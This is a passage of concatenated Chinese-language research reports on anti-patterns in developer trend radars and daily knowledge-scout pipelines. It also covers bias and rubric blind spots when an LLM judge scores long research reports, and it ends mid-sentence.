URL equality 去重，无法识别 “同一个 repo 被 HN 讨论、被 PH launch、被 X 做成 trend phrase、被 Reddit 在多个社区复述” 这种真实扩散路径。\\n\\n### 4. `time-window collapse` 会把短期爆点错当长期结构变化\\n\\n- [推断 | 高置信度] GitHub Trending 的 today excitement、HN 的 points/time、Product Hunt 的 day/week/month、X 的 popular now、Reddit Home 的持续个性化 feed，本质上是 5 种不同钟表。把它们直接放进同一时钟，会把“今天很热”和“这个月持续有效”混为一谈。\\n- [推断 | 中高置信度] 这也是为什么 launch-day 工具、节奏型 hype、争议型 HN 讨论、区域性 X trend 很容易在多源聚合里被放大过头。\\n\\n### 5. `trust-blind ranking` 会让操纵、过滤与治理信息全部丢失\\n\\n- [推断 | 高置信度] HN、Product Hunt、X 都明确把 anti-abuse、health、manual moderation、vote authenticity、spam filtering 写进了可见性逻辑里。如果雷达只保留最后的 engagement 结果，而不保留这些治理信号，就等于把平台已经替你做过的风险判断全部抹掉。\\n- [推断 | 高置信度] 对 2026 的开发者趋势雷达，`quality / trust` 不应是附属分，而应是主分之一。否则系统会偏爱最会制造表层互动的对象，而不是最可能持续进入开发者工作流的对象。\\n\\n### 6. `black-box personalization` 会让用户既不信，也无法纠偏\\n\\n- [推断 | 高置信度] Reddit 明确允许关掉 Home recommendations；X 允许关掉 tailored trends、改位置、报不感兴趣；GitHub 提供 stars / topics / lists。用户已经习惯对信息流做显式控制。若雷达只偷偷学用户行为，不给他们编辑兴趣、屏蔽主题、解释推荐原因，最终只会得到“看起来懂我，实际上经常偏”的黑箱。\\n- [推断 | 中高置信度] 对开发者用户尤其如此。因为他们往往不是要“娱乐推荐”，而是要 `可校正的工作流雷达`。\\n\\n### 7. 当前强主轴会制造 `coverage collapse`\\n\\n- [推断 | 高置信度] 2026-04 的最强主轴的确是 `AI coding agents + MCP/Skills + browser/computer use`，但如果雷达因此把大部分 top slots 都给这个主题，就会错过其他仍在升温的 lane，例如基础设施工具、开源数据库、语言生态、构建链、运维/观测变化。\\n- [推断 | 中高置信度] 因而真正稳定的雷达，不是“找出当下最大的波”，而是“在承认最大波存在的同时，不让它淹没所有其他信号”。\\n\\n## 常见反模式总表\\n\\n| 反模式 | 典型表现 | 为什么会失败 | 应设置的边界 |\\n| --- | --- | --- | --- |\\n| `source-blind aggregation` | 把 stars、HN points、PH points、Reddit votes、X trends 直接归一后求和 | 原始数值语义不同，治理与时间窗不同 | 先保留 source role，再做 cluster 组合 |\\n| `narrative != adoption` | 把 X / PH / HN 热议当作真实工作流渗透 | 讨论常先于可用性成熟，尤其在 agent / MCP 赛道 | 把 `workflow fit` 与 `controversy` 单列 |\\n| `URL-only dedupe` | 只按链接去重 | 同一事件会跨 repo、launch、story、trend phrase 扩散 | 以 `canonical entity + event cluster` 为主键 |\\n| `time-window collapse` | 把 today、week、month、personalized feed 混排 | 会把短期爆点误判为长期结构变化 | 分离 `freshness` 与 `durability` |\\n| `trust-blind ranking` | 只看 engagement，不看过滤/风控 | 会放大操纵、spam、争议性低质内容 | 引入 `quality/trust` 主维度 |\\n| `black-box personalization` | 用户看不懂为何推荐，也无法改兴趣 | 推荐不可纠偏，信任快速下降 | 提供 editable profile、negative feedback、explanation |\\n| `coverage collapse` | 当前大主题占满榜单 | 系统丢失横向观察能力 | 做 topic diversity / lane caps |\\n\\n## 建议\\n\\n- [建议 | 前提：后续要进入维度5 与 Round 2] 从这一轮开始，把雷达的失败防线写进 schema，而不是只写进讨论：\\n  1. `source_role`\\n  2. `canonical_entity`\\n  3. `event_cluster`\\n  4. `freshness_window`\\n  5. `quality_trust`\\n  6. `controversy_flag`\\n  7. `workflow_fit`\\n  8. `user_fit_reason`\\n\\n- [建议 | 前提：后续要做打分] 不要产出单一总分，至少拆成 5 个并列维度：\\n  1. `momentum`\\n  2. `cross-source confirmation`\\n  3. `quality / trust`\\n  4. `workflow fit`\\n  5. `user fit`\\n  然后再做 post-rank diversity。\\n\\n- [建议 | 前提：要做跨源去重] 优先构建 `event cluster`，而不是先优化 fancy ranker。对这个题目，cluster 对不对，通常比模型重不重要更影响最终质量。\\n\\n- [建议 | 前提：要做个人兴趣过滤] 用户画像不要只存 `Python / AI / Infra` 这类 topic tag，还应有：\\n  1. `object preference`：repo / launch / discussion / workflow\\n  2. `source trust preference`\\n  3. `recency preference`\\n  4. `negative preference`\\n  5. `delivery mode`：实时、日报、周报\\n\\n- [建议 | 前提：当前强主轴仍是 AI coding agents] 对 `AI coding agents + MCP/Skills + browser/computer use` 这条 lane，必须额外记录 3 个反向字段：\\n  1. `operational friction`\\n  2. `silent-failure risk`\\n  3. `CLI-vs-protocol fit`\\n  否则系统会把“热烈讨论一个新玩具”和“可持续进入工作流”混为一谈。[S17][S18]\\n\\n====\\nFILE: reports/round1-dimension4-knowledge-scout-antipatterns-and-failure-cases.md\\n# Round 1 - 维度4：反模式与失败案例\\n\\n- 主题：每日知识侦察\\n- 任务：调研常见误区、反模式、失败原因与边界条件\\n- 完成日期：2026-04-18\\n- 研究窗口：`2025-01-01` 到 `2026-04-18`\\n- 检索原则：优先使用 2025-2026 官方产品文档、官方 changelog 与本地工作区资料；把产品演进视为失败模式的反向证据\\n\\n## 结论摘要\\n\\n2025-2026 语境下，`daily knowledge scout` 最常见的失败，不是“源不够多”，而是 `控制面缺失`：没有可信源闸门、没有时间窗内的变化监控、没有评分去重、没有跨会话记忆、没有把新发现连接到旧认知。系统看起来每天都在产出，实际上却在持续制造噪音和伪确定性。\\n\\n主流产品的演进已经把这些失败点暴露得很清楚。OpenAI 在 `2026-02-10` 给 deep research 增加 trusted sites，并同时承认 deep research 仍可能 hallucinate facts、误判 rumors、置信度表达失真；GitHub 在 `2025-08-20` 宣布 knowledge bases 于 `2025-11-01` 退役，转向会自动同步 GitHub 源变化的 Spaces；GitHub Copilot Memory 又在 `2026-01-15` 到 `2026-03-04` 这段时间明确把 memory 设计成 repository-scoped、可验证、28 天自动过期；NotebookLM 让用户显式 include/exclude sources，并把“几百个候选源”压到“最多 10 个推荐源”；Sourcegraph 则要求 monitor 必须围绕 `type:commit` / `type:diff` 运行，并提醒 untrusted 目标不要发送原始结果。[S1][S2][S3][S4][S5][S6][S7][S8]\\n\\n放到当前本地语境里，这些都不是抽象教训。最近 7 天内，`~/Desktop/code` 下有 `34` 个活跃 repo、`54` 个研究目录、`500` 份更新过的报告；而 `rss-scout` 已明确记录“`500` 行扁平报告里 `68%` 是版本号噪音”。这说明如果 daily scout 还停留在“每天搜一圈+写一份平铺摘要”，它必然会退化成噪音机器，而不是个人知识库入口。[L1][L2][L3]\\n\\n## 事实\\n\\n### 1. 官方产品正在把“可信源控制”做成第一层护栏\\n\\n- [事实] OpenAI 在 `2026-02-10` 更新 deep research，允许把 web search 限制到 trusted sites，并可在研究过程中实时跟踪和中断调整方向。[S1]\\n- [事实] OpenAI 同时在 deep research 的 limitations 中明确写出：它仍可能 hallucinate facts、做出错误推断、难以区分 authoritative information 与 rumors，且在 confidence calibration 上仍然偏弱。[S1]\\n- [事实] NotebookLM chat 明确只使用当前 notebook 中的 sources 回答问题，并允许用户对每个 source 做 include/exclude 控制。[S7]\\n- [事实] NotebookLM `Discover sources` 会先从 web 上抓取数百个候选源，再压缩成最多 `10` 个 source recommendations，并附带 relevance summary。[S8]\\n\\n这说明 2025-2026 的产品共识不是“让模型接触更多源”，而是“先缩小 source set，再综合”。\\n\\n### 2. 官方产品正在系统性淘汰“静态上下文层”\\n\\n- [事实] GitHub 在 `2025-08-20` 宣布 Copilot knowledge bases 将于 `2025-11-01` 退役，并完全由 Copilot Spaces 取代；公告直接说明 Spaces 能承载 code、Markdown、JSON、images、issues、pull requests 等更多类型上下文。[S2]\\n- [事实] GitHub Docs 对 Copilot Spaces 的描述强调：GitHub files 和其他 GitHub-based sources 会随着源变化自动更新，使 Copilot 保持 grounded。[S3]\\n- [事实] GitHub 在 `2026-01-15` 宣布 agentic memory public preview，明确 memory 是 repository-specific，并会在使用前 against current codebase 做 validation，且 `28` 天自动过期以避免 stale information。[S4]\\n- [事实] GitHub 在 `2026-03-04` 进一步把 Copilot Memory 默认开启给 Pro/Pro+ 用户，并再次强调 stale or inaccurate context 在 validation 失败时不会被使用。[S5]\\n- [事实] GitHub 关于 agentic memory 的工程文章还明确指出：某个 branch 上观察到的约定可能后来被修改、被替代、或者根本没有 merge，因此 memory 需要实时验证 citation，而不能静态相信旧结论。[S6]\\n\\n这组变化实际在说同一件事：`静态报告`、`静态文档库`、`静态记忆` 都会腐烂。\\n\\n### 3. 官方监控能力已经把“每日侦察”定义成变化流问题，而不是全文搜索问题\\n\\n- [事实] Sourcegraph Code Monitoring 会把查询运行在每一个新 commit 上，只要有新的 search results 就触发事件。[S9]\\n- [事实] Sourcegraph 明确要求 monitor query 必须是 `type:commit` 或 `type:diff`，否则无法稳定检测“新结果”。[S9]\\n- [事实] Sourcegraph 还写出两类重要边界：一是 monitor 数量、repo 数量、commit 频率上来以后可能 hit soft limits，执行频率会下降；二是不要把 raw results 发送到 untrusted destination，因为匹配结果可能含敏感代码。[S9]\\n\\n这说明 `daily scout` 的“发现层”如果不围绕 `变化` 建模，而只是每天重跑全文扫描或手动巡检，迟早会在规模和治理两侧同时失效。\\n\\n### 4. 本地工作区已经出现了典型失败信号\\n\\n- [事实] `/Users/lifcc/Desktop/code/AI/research/REPORTS_INDEX.md` 在 `2026-04-17` 记录已有 `31` 个 research runners、`475` 份 reports。[L1]\\n- [事实] `2026-04-18` 本地 shell 统计显示：最近 7 天有 `34` 个活跃 repo、`54` 个研究目录、`500` 份更新过的 `reports/*.md`。[L2]\\n- [事实] `rss-scout` roadmap 把当前最大痛点写得非常直接：`500 行扁平报告 68% 是版本号噪音`，因此才需要 `tier/kind`、四维评分、P0/P1/P2 分层和 changelog 压缩。[L3]\\n- [事实] `knowledge-scout` 改进实验显示，代码关键词预过滤对 Claude 高价值条目的覆盖率只有 `62.9%`，会漏掉大量语义相关内容；而真正缺的不是更多抓取，而是 `Connect` 和 `Compound` 两步，以及 Insight Card / Bridge Note / feedback loop。[L4]\\n- [事实] `remem` README 把“session amnesia / lost context / no continuity”列为 persistent memory 要解决的核心问题。[L5]\\n- [事实] `auto-run-agent` README 也把 `TASKS.md -> CONTEXT.md -> DONE.md` 明确定位为跨会话外部记忆，用来突破单次会话 context window 限制。[L6]\\n\\n这说明当前本地生态已经证明：真正的风险不在“发现不到变化”，而在“发现太多却没有稳定压缩和继承机制”。\\n\\n## 核心反模式\\n\\n| 反模式 | 典型表现 | 为什么会失败 | 边界条件 |\\n| --- | --- | --- | --- |\\n| `A1. 无 trusted-source gate 的全量收源` | 把 repo、网页、博客、报告、截图、PR、Issue 全量丢给模型 | OpenAI 已明确 deep research 仍会 hallucinate、误判 rumors；NotebookLM 也把 source include/exclude 和最多 10 条推荐做成默认交互，说明 source set 必须先收缩再综合。[S1][S7][S8] | 广度探索阶段可以先放宽，但进入知识库前必须收口到可验证 source set |\\n| `A2. 把“带 citations 的摘要”误当成“已验证结论”` | 看到引用链接就直接入库，不再回看原文 | OpenAI 明确说 deep research 仍可能 facts/inference 出错，甚至 citations/report formatting 也可能有问题；citation 是校验入口，不是真理印章。[S1] | 低风险 brainstorming 可接受；进入长期知识库时必须二次核验关键 claim |\\n| `A3. 把一次性报告或静态文档库当长期知识层` | 报告写完就当 canonical truth，不再同步源变化 | GitHub 退役 knowledge bases、转向自动同步的 Spaces；Copilot Memory 还专门加了 current-code validation 和 28 天过期机制，说明 stale context 是一等风险。[S2][S3][S4][S5][S6] | 稳定、低变化的参考资料可静态保存，但动态工程上下文必须有同步/TTL/validation |\\n| `A4. 把 daily scout 做成“每天手动搜一遍”` | ad-hoc shell 命令、零散浏览器 tab、没有 saved query/monitor | Sourcegraph 把 code monitoring 定义成对新 commit 的持续 query；如果没有变化流视角，就会反复重扫旧噪音、漏掉真正的新 delta。[S9] | 非持续性专题研究可以临时搜索；日更系统必须沉淀 query registry |\\n| `A5. 不做 score / dedupe / tiering，所有变化都进日报` | 平铺 300-500 行列表，版本号和真正 insight 混在一起 | 本地 `rss-scout` 已经证明这种报告 `68%` 是版本噪音；强信号被弱信号淹没，读者不再信任日报。[L3] | 小样本阶段可暂时平铺；一旦超过十几个源或几十个 repo，就必须分层 |\\n| `A6. 只有 summary，没有 Connect / Compound` | 每条发现都是独立摘要，没有“旧共识 vs 新发现”，也没有跨源桥接 | 本地改进实验已把缺口直接定位为 `Connect` 和 `Compound` 缺失；没有 Bridge Note 和 feedback loop，知识只会堆积，不会复利。[L4] | 单次研究交付可先停在 summary；daily scout 作为知识系统入口时不能停在这里 |\\n| `A7. 无跨会话记忆，每天从零开始` | 每次重新解释项目、重新扫描、重新判断“这条以前见没见过” | `remem` 与 `auto-run-agent` 都把 session amnesia 视为核心问题；没有 external memory，daily scout 会持续重复劳动，且对历史判断不稳定。[L5][L6] | 一次性短任务无所谓；持续 runner 必须有 memory layer |\\n| `A8. 把原始结果发往不受信任通道` | 把 raw diff、命中代码、内部配置直接推到邮件/Slack/群组 | Sourcegraph 明确警告 untrusted destination 不应附带 results，因为结果本身可能包含敏感代码；这类系统若没有治理，会从知识系统退化成泄露面。[S9] | 可信内部通道可发送摘要或受控结果；默认不应外发原始匹配内容 |\\n\\n## 失败原因的底层机制\\n\\n### 1. `Source-set inflation`\\n\\n源集合一旦失控，模型会同时面对 rumor、重复源、低质量转述和过期材料。结果不是“多看更准”，而是：\\n\\n- 校准能力下降\\n- 置信表达虚高\\n- 引用链更长但结论更脆\\n- 最终难以判断哪条 insight 真值得入库\\n\\n### 2. `Staleness drift`\\n\\n知识条目最怕的不是旧，而是“看起来还像真的旧”。GitHub 把 KB 退役、Memory 加验证和 TTL，本质都在对抗这一点。没有同步、验证和过期机制的 knowledge scout，最终会把过期模式伪装成当前最佳实践。[S2][S3][S4][S5][S6]\\n\\n### 3. `Delta blindness`\\n\\n如果侦察系统不围绕 `最近 7 天新增了什么` 建模，而是围绕 `全文里有什么` 建模，就会出现两个后果：\\n\\n- 每天重复阅读旧材料\\n- 关键变化被埋在大量静态背景里\\n\\n这正是 Sourcegraph 强制 `type:commit` / `type:diff` 的原因。[S9]\\n\\n### 4. `Knowledge doesn’t compound`\\n\\n只有 capture 和 summary，没有 connection、bridge、feedback，意味着知识单元之间不会互相增强。系统每天都会“有产出”，但不会更懂你自己的工程生态。[L4]\\n\\n### 5. `Governance lag`\\n\\n当侦察系统进入多 repo、多报告、多分发通道状态后，治理问题不会以报错形式出现，而是以三种静默退化出现：\\n\\n- 敏感结果误发\\n- query 太多导致执行变慢或不稳定\\n- 读者对日报逐步失去信任\\n\\n## 推断\\n\\n- [推断 | 置信度：高] 2025-2026 的 daily knowledge scout 最大失败模式，是把它误做成“搜索工作流”而不是“知识控制面”。因为主流产品新增的能力几乎都在 source gating、scoped context、validation、TTL、monitoring、privacy guard 这些控制位上，而不是单纯扩上下文。[S1][S2][S3][S4][S5][S7][S8][S9]\\n- [推断 | 置信度：高] 对当前本地场景来说，最危险的不是漏掉个别 repo，而是继续接受“平铺日报 + 无桥接摘要 + 每次从零开始”的默认流程。`34` 个活跃 repo、`54` 个研究目录、`500` 份近期报告，已经远超人工稳定消化阈值。[L1][L2][L3]\\n- [推断 | 置信度：高] 本主题里最该优先防守的反模式顺序应是：`source gate 缺失 -> score/dedupe 缺失 -> connect/compound 缺失 -> memory layer 缺失`。因为这四个问题一旦叠加，系统会先失真，再失焦，最后失忆。[S1][S7][S8][L3][L4][L5][L6]\\n- [推断 | 置信度：中高] “有 citations” 应只被视为进入核验阶段的门票，而不是可直接写进长期知识库的充分条件。OpenAI 已明确说明 cited research 仍会出现 hallucination、incorrect inference 与 citation/report formatting errors。[S1]\\n- [推断 | 置信度：中高] 后续如果要把本地 `knowledge scout` 真正做成个人知识库入口，核心不是再加采集器，而是设计 4 个强约束：`trusted-source contract`、`query registry`、`insight schema`、`memory/feedback loop`。[S3][S4][S9][L4][L5][L6]\\n\\n## 建议\\n\\n### 1. 立即把反模式转成 5 道硬闸门\\n\\n1. `Source Gate`\\n   - 每次综合前，限定 trusted sites / repo / reports 范围。\\n2. `Delta Gate`\\n   - 只看最近 7 天新增或变化的对象，不重扫全量。\\n3. `Noise Gate`\\n   - 所有信号先做 score / dedupe / P0-P2 分层。\\n4. `Insight Gate`\\n   - 进入知识库前，必须补齐 `旧共识 vs 新发现`。\\n5. `Memory Gate`\\n   - 每条保留 insight 必须说明写入哪里、保留多久、如何被下次引用。\\n\\n### 2. 把最危险的 3 类失败前置监测\\n\\n- `source_sprawl`\\n  - 指标：单次综合使用的不同源数量、不同域名数量\\n- `noise_saturation`\\n  - 指标：原始信号数 / 最终入库 insight 数压缩率\\n- `repeat_without_compound`\\n  - 指标：本周有多少新报告没有引用旧 insight、没有生成 bridge\\n\\n### 3. 维度5 最值得继续追问的分层差异\\n\\n- 个人开发者 vs 多 repo 个人栈：什么时候需要 memory layer\\n\\n====\\nFILE: reports/round1-dimension4a-session-quality-scorer-judge-bias-and-evaluation-failure-modes.md\\n# Round 1 · 维度4a：Session 质量评分系统的 Judge 偏置与评分失真\\n\\n- 完成时间：2026-04-18 05:15（Asia/Shanghai）\\n- 研究范围：2025-2026 可访问资料；官方页面与论文统一于 2026-04-18 检索\\n- 子任务范围：聚焦 `LLM-as-judge` 在 `report-level` 评分中的偏置、失真、错误用法与边界条件；不覆盖结构 rubric 细化与落地流程细节\\n- 输出规则：事实、推断、建议分开写；事实带来源，推断标注置信度，建议写清前提\\n\\n## TL;DR\\n\\n- 这个题目的头号反模式不是“judge 模型不够强”，而是把 `单个未校准的 LLM judge` 当成稳定量尺，直接给 `475 reports` 打分、排序、切 top/bottom 10%。2025-2026 的官方文档和论文都在反复否定这种做法。[S1][S2][S3][S4][S5][S6][S7][S8]\\n- 最常见的 5 类评分失真已经很明确：\\n  1. `single-judge total-score`：一个 judge 读完整篇直接打总分。\\n  2. `uncalibrated scalar ranking`：把点数分当排序真相。\\n  3. `length/position/format bias`：把更长、更像模板答案的报告判成更好。\\n  4. `judge interchangeability illusion`：换 judge / 换模型却默认标准不变。\\n  5. `automation-as-replacement`：把自动 judge 当作专家终审替代品。\\n- 对 `report-level` 长文评分，这些问题会被进一步放大，因为研究报告天然更长、更开放、允许多种有效解法，也更依赖隐含上下文、结构逻辑和证据链。[S10][S11][S12]\\n- 行业较稳的共识不是“找到最强 judge”，而是：`多维 rubric -> 控制偏置 -> 边界 pairwise -> 小样本人类校准 -> 持续审计`。[S1][S2][S3][S7][S8][S9]\\n\\n## 事实\\n\\n### 1. 官方指南已经把若干典型反模式点名了\\n\\n- [事实] OpenAI `Evaluation best practices` 明确把以下内容列为 anti-patterns：`overly generic metrics`、`biased design`、`vibe-based evals`、`ignoring human feedback`。[S1]\\n- [事实] 同一文档明确建议：LLM 更适合做 `pairwise comparisons`、`classification` 与 `scoring against specific criteria`，而不是开放式打分；并点名 `position bias` 与 `verbosity bias` 是 judge 常见问题，建议优先采用 `pairwise comparison or pass/fail` 并控制回复长度。[S1]\\n- [事实] Anthropic 文档明确写到大多数 use case 需要 `multidimensional evaluation`，而不是单一总指标；Anthropic 在 2026 年 research eval 实践中也强调应组合不同 grader 类型，而不是让单一 judge 包打天下。[S2][S3]\\n\\n这说明：从官方方法论层面看，`单 judge + 单总分 + 不做人类校准` 本身就是已知坏模式。\\n\\n### 2. 2025-2026 的 judge 研究已经把“不一致”做成了显式问题定义\\n\\n- [事实] `TrustJudge` 在 2025-09-25 直接定义了两类核心不一致：\\n  1. `Score-Comparison Inconsistency`：点数更高的答案，在两两比较里反而输给点数更低的答案。\\n  2. `Pairwise Transitivity Inconsistency`：偏好关系出现循环或等价矛盾。[S4]\\n- [事实] `Beyond Consensus` 在 2025-10-13 指出，LLM judges 存在强烈 `positive bias / agreeableness bias`，也就是更容易“同意”或放过看起来还行的输出，而不够擅长稳定识别差输出。[S5]\\n- [事实] `Evaluative Fingerprints` 在 2026-01-08 指出，不同 judge 的 disagreement 不是随机噪声，而是稳定的“evaluative disposition”；论文直言 judges 不是可互换的测量仪器。[S6]\\n- [事实] `Causal Judge Evaluation` 在 2025-12-11 进一步指出：未校准的廉价 judge proxy 可能 `invert rankings entirely`，而 naive confidence intervals 在 raw judge scores 上甚至会出现接近 `0% coverage`。[S7]\\n\\n这说明：只要系统把 scalar judge score 直接当真，就不是“有一点噪声”，而是可能在统计上把排序方向都弄反。\\n\\n### 3. 长报告任务会放大 judge 的表层偏置和构念偏置\\n\\n- [事实] `ResearchRubrics` 指出，deep research 输出评估之所以困难，是因为响应 `lengthy and diverse`、存在多种有效解法、还依赖动态信息源；其结果显示领先系统平均 rubric compliance 仍低于 `68%`，主要问题是 `missed implicit context` 和 `inadequate reasoning about retrieved information`。[S11]\\n- [事实] `ReportBench` 明确把评估拆成两类：\\n  1. 引用文献质量与相关性。\\n  2. 报告中 statements 的 faithfulness / veracity。\\n  其自动评估框架会单独抽取 citations 和 statements，再分别核验。[S10]\\n- [事实] `ReportLogic` 进一步把长报告质量拆成 `Macro-Logic`、`Expositional-Logic`、`Structural-Logic` 三层，核心问题是：读者能否沿统一主线理解报告，并追踪 claim-support 关系。[S12]\\n\\n这说明：对长报告，如果 judge 还在给“整体印象分”，那它很可能只是被表面流畅度、篇幅、结构感或措辞说服，而没有真正评到证据、逻辑和支撑。\\n\\n### 4. 生产级系统没有把自动 judge 当作无须人工的终审器\\n\\n- [事实] Anthropic 在 2026 年案例中明确写到，Descript 的实践是从人工 grading 演进到 `LLM graders + periodic human calibration`，而不是直接取消人工。[S2]\\n- [事实] LangSmith 文档直接写明：`LLM-as-a-judge evaluators don't always get it right`，因此支持人工 audit evaluator scores，并把人工修正回灌到 few-shot examples 中。[S9]\\n- [事实] OpenAI `GDPval` 使用的是职业专家 blind comparison；官方同时明确写出 automated grader `not yet as reliable as expert graders`，因此不会拿它替代专家评分。[S8]\\n\\n这意味着：如果一个系统没有人工校准/纠错位点，它不是“更自动化”，而是少了一道已被行业证明必要的安全阀。\\n\\n## 推断\\n\\n### 1. 对本项目而言，最危险的反模式就是 `单次点数分直接切桶`\\n\\n- [推断 | 高置信度] 当前项目要给 `475 reports` 做 `coverage / depth / structure / novelty` 评分，并识别 `top/bottom 10%` 特征；如果直接让一个 judge 读完整篇一次性给四个分，然后按总分切 top/bottom bucket，大概率会被以下因素污染：\\n  1. 长度偏置\\n  2. 书面流畅度偏置\\n  3. judge 自身的稳定偏好\\n  4. 新颖度的过度奖励\\n  5. 边界样本的离散分数抖动\\n- [推断 | 高置信度] 这些污染在 top/bottom 10% 边界上尤其危险，因为 cutline 附近本来就只差少量分数，一点点 judge 偏置就足以把样本分到相反桶里。[S1][S4][S7]\\n\\n### 2. `judge 可互换` 是很容易被忽略的系统级错误\\n\\n- [推断 | 高置信度] 如果后续换了 judge 模型、换了 prompt、换了 reasoning 设置，却还把新旧分数放在同一条刻度上比较，就会把 evaluator fingerprint drift 当成“报告质量变化”。[S6]\\n- [推断 | 中高置信度] 这类错误最隐蔽，因为分数表面上仍然看起来有序，但其实测量尺子已经换了。\\n\\n### 3. `新颖度` 是四个目标维度中最容易被 judge 幻觉放大的项\\n\\n- [推断 | 高置信度] 相比覆盖度、深度、结构，`新颖度` 缺少同等级成熟的通用外部标准；在未校准状态下，judge 很容易把“说法反直觉”“措辞新鲜”“概念包装强”误判为真正的洞见。\\n- [推断 | 高置信度] 因此，`novelty` 最容易成为把低可靠报告误送进 top 10% 的入口，尤其当报告很长、语言很顺、结论听起来很“像咨询报告”时。\\n\\n### 4. 报告级任务若不拆维度，就会默认奖励“长但像样”\\n\\n- [推断 | 高置信度] `ReportBench` 和 `ReportLogic` 都在说明：报告质量至少应拆成 citation / statement / claim-support / logical arc 等通道单独检查。[S10][S12]\\n- [推断 | 高置信度] 因而，对于本项目，`整体印象分` 本质上是一种高风险 shortcut；它更像“读者是否被文本说服”，而不是“报告是否真的覆盖充分、分析扎实、结构可靠”。\\n\\n## 常见反模式总表\\n\\n| 反模式 | 典型表现 | 为什么会失败 | 对本项目的直接后果 |\\n| --- | --- | --- | --- |\\n| `single-judge total-score` | 一个 judge 读完全文直接给综合印象分 | 把多个构念压扁成单变量，长度与文风会盖过证据质量 | 排行榜更像“谁写得像好报告”而不是“谁真更好” |\\n| `uncalibrated scalar ranking` | 直接按 1-5 / 1-10 分排序并切 top/bottom 10% | 点数分与 pairwise 偏好不一致，边界样本易错分 | top/bottom 10% 特征被错误样本污染 |\\n| `judge interchangeability illusion` | 换模型/换 prompt 后继续对比旧分 | judge 有稳定指纹，不是同一把尺子 | 误把 judge 漂移看成质量变化 |\\n| `length/position/format bias` | 更长、更规整、更像模板答案的报告更容易高分 | judge 存在 verbosity / position / style 偏置 | 长但空的报告被高估 |\\n| `automation-as-replacement` | 没有人类 audit，自动分数直接进决策 | 官方与生产案例都不支持这种替代 | 错分无法被系统性纠正 |\\n| `novelty-first scoring` | 把“看起来新”过早纳入高权重 | 新颖度定义弱，最易被幻觉放大 | 花哨但证据弱的报告冲进高分桶 |\\n\\n## 建议\\n\\n### 1. 禁止把 `单次点数分` 当作 top/bottom 10% 的终局依据\\n\\n- [建议 | 前提：目标是稳定找高低质量样本] 全量 475 份报告可以先做 analytic rubric 初筛，但 cutline 附近必须追加 `pairwise rerank` 或人工复判，不要直接按 raw scalar score 切桶。[S1][S4][S7]\\n\\n### 2. 从第一版起就把 `校准` 做成正式模块，而不是补丁\\n\\n- [建议 | 前提：允许少量人工介入] 建立一套 `human anchor set`，至少覆盖：\\n  1. 明显高质量\\n  2. 明显低质量\\n  3. 长但空\\n  4. 短但密\\n  5. 结构完整但洞见弱\\n  6. 洞见强但支撑弱\\n- [建议 | 前提：会持续迭代 judge] 每次 judge / prompt / rubric 变更，都先回归这批锚点样本，再决定是否接受新刻度。\\n\\n### 3. 对所有高风险维度执行 `show rather than tell`\\n\\n- [建议 | 前提：仍使用 LLM judge] 按 OpenAI 官方建议，为至少 `depth / structure / novelty` 提供分档说明与代表样例，而不是只给抽象定义。[S1]\\n- [建议 | 前提：要降低 verbosity bias] 在 judge 输入侧尽量控制比较样本的展示长度，或显式提醒 judge 不要把篇幅和质量混淆。[S1]\\n\\n### 4. 显式记录 `judge version`，不要让评分标准漂移成隐形变量\\n\\n- [建议 | 前提：后续要比较多轮评分结果] 每份评分结果至少记录：\\n  1. judge model\\n  2. judge prompt version\\n  3. rubric version\\n  4. calibration set version\\n  5. audit status\\n- [建议 | 前提：要做跨轮分析] 没有这些元数据，就无法判断分数变化来自报告本身还是来自评分器变化。\\n\\n### 5. 在系统目标上，把自动 judge 定位成 `筛选器`，不是 `终审器`\\n\\n- [建议 | 前提：当前任务是找特征，不是做权威认证] 自动 judge 更适合做：\\n  1. 全量粗排序\\n  2. 异常样本发现\\n  3. 边界样本候选集缩小\\n  4. failure tag 预标注\\n- [建议 | 前提：需要对外给出可信结论] 最终的 top/bottom 10% 特征总结，应建立在 `自动评分 + pairwise 复判 + 抽样人工审计` 的组合上，而不是某次单跑结果上。\\n\\n## 本轮最值得记住的结论\\n\\n\\n====\\nFILE: reports/round1-dimension4b-session-quality-scorer-rubric-and-structural-blind-spots.md\\n# Round 1 · 维度4b：Session 质量评分系统的 Rubric / 结构盲区\\n\\n- 完成时间：2026-04-18 05:03（Asia/Shanghai）\\n- 研究范围：2025-2026 可访问资料；官方页面与论文统一于 2026-04-18 检索\\n- 子任务范围：聚焦 `粗糙 rubric`、`固定 rubric`、`结构逻辑漏检`、`citation / claim-support 未分列` 等失败模式；不展开人工校准、judge 漂移和阈值治理，这些留给 `4c`\\n- 输出规则：事实、推断、建议分开写；事实带来源，推断标注置信度，建议写清前提\\n\\n## TL;DR\\n\\n- 这个题目在 `4b` 里的核心风险，不是 judge 自身偏不偏，而是 `rubric 设计错了以后，judge 会稳定地评错东西`。2025-2026 的官方指南和新论文都在反复否定 `generic / coarse / fixed rubric`。[S2][S3][S9][S10][S12]\\n- 对 `report-level` 长文评分，最大的结构性盲区不是“有没有目录”，而是 `是否能把关键结论追溯到显式 support`。`ReportBench` 把 citation 与 statement 分开核验，`ReportLogic` 把结构拆成 `Macro-Logic / Expositional-Logic / Structural-Logic`，已经把这件事说得很清楚。[S7][S8]\\n- 2025-2026 最强的 research/report benchmarks 几乎都不再使用“整篇一个印象 rubric”。`ResearchQA`、`ResearchRubrics`、`DeepResearch Bench II`、`PaperBench` 都在往 `query-specific / fine-grained / hierarchical rubrics` 收敛。[S4][S5][S6][S13]\\n- 对本项目最危险的 4b 反模式是：只给 `coverage / depth / structure / novelty` 四个大项分数，却不拆子项，也不单独检查 `citation quality`、`claim-support`、`limitations`、`comparisons`、`macro-logic`。这样筛出来的 top 10% 很容易只是“写得像好报告”。[S4][S7][S8][S9][S10]\\n- 因此，`4b` 的最小可行结论不是“把 rubric 写详细一点”，而是：`把维度拆原子项、把 support 通道单列、把结构定义成可审计逻辑，而不是版式印象`。校准与阈值治理再交给 `4c`。\\n\\n## 事实\\n\\n### 1. 官方指南已经把“粗糙、泛化、不分维度”的 eval 设计列为反模式\\n\\n- [事实] OpenAI `Evaluation best practices` 明确把 `overly generic metrics`、`biased design`、`vibe-based evals`、`ignoring human feedback` 列为 anti-patterns，并要求 eval 设计 `task-specific`，同时指出 LLM judge 更适合 `pairwise comparisons`、`classification`、`scoring against specific criteria`，而不是开放式印象判断。[S2]\\n- [事实] 同一文档还明确写到，LLM judge 的 rubrics 应该 `clear and detailed`，并建议采用 `show rather than tell`、加入 `pass/fail threshold`、控制 `verbosity bias`。[S2]\\n- [事实] Anthropic 文档明确写到：大多数 use case 需要 `multidimensional evaluation`；同一个 use case 甚至同一条 success criteria 往往也需要 `several rubrics for holistic 